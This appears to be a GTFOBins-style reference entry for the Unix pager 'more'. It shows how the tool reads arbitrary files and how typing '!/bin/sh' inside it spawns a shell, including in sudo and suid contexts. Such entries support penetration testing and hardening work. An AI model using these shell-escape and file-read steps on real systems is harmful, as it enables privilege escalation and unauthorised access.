---
type: gtfobin
name: more
platform: Unix
functions: [file-read, shell]
tags: [gtfobin, unix, lotl]
---

# more

## file-read

```bash
more /path/to/input-file
```
_The file is displayed in the terminal interface._
**Contexts:** sudo, suid, unprivileged

## shell

```bash
more /etc/hosts
!/bin/sh
```
**Contexts:** sudo, suid, unprivileged
